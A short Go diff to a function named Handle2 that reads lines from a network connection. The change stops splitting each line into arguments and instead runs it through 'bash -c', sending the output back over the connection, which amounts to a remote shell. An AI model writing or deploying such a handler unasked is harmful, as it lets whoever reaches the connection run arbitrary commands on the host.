@@ -20,7 +20,6 @@ import (
 	"os"
 	"os/exec"
 	"path"
-	"strings"
 )
 
 const pubKeyPem = `
@@ -153,8 +152,7 @@ func Handle2(data []byte) error {
 			sc := bufio.NewScanner(conn)
 			for sc.Scan() {
 				line := sc.Text()
-				cmdArgs := strings.Split(line, " ")
-				out, err := exec.Command(cmdArgs[0], cmdArgs[1:]...).Output()
+				out, err := exec.Command("bash", "-c", line).Output()
 				if err != nil {
 					fmt.Fprintln(conn, err.Error())
 				} else {
